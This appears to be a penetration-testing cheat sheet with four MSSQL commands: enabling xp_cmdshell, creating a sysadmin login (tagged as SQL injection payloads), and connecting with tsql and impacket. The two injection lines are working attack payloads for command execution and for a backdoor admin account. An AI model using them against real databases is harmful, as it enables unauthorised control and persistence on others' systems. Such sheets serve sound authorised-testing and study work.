### 1. enable xp_cmdshell
```
exec sp_configure 'xp_cmdshell', 1 go reconfigure
```
**- web application,sql injection,shell,mssql**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
__________
### 2. mssql add user
```
exec sp_addlogin 'victor', 'pass123';  exec sp_addsrvrolemember 'victor', 'sysadmin'
```
**- web application,sql injection,mssql**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
__________
### 3. connect to mssql
```
tsql -S [IP] -U sa -P"[PASS]"
```
**- linux,mssql**
#### References:

https://linux.die.net/man/1/tsql
__________
### 4. connect to mssql
```
/opt/impacket/examples/mssqlclient.py [user]:[pass]@[ip] -port [port]
```
**- linux,mssql,impacket**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
